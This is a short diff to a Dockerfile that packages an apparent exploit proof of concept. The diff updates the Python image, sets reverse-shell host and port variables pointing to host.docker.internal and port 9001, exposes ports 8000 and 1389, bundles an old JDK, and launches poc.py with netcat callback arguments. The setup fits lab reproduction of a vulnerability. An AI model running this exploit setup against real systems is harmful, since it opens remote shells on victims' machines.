@@ -1,7 +1,8 @@
-FROM python:3.9-bullseye
+FROM python:3.10.1-bullseye
 
 ENV RSHELL_PORT="9001"
-ENV RSHELL_IP="localhost"
+ENV RSHELL_IP="host.docker.internal"
+ENV WEB_IP="host.docker.internal"
 
 EXPOSE 8000/tcp
 EXPOSE 1389/tcp
@@ -17,4 +18,4 @@ COPY jdk1.8.0_20 /home/poc/jdk1.8.0_20
 WORKDIR /home/poc
 RUN pip3 install -r requirements.txt
 
-CMD python3 poc.py --userip $RSHELL_IP --webport 8000 --lport $RSHELL_PORT
+CMD python3 poc.py --webip $WEB_IP --webport 8000 --ncip $RSHELL_IP --ncport $RSHELL_PORT
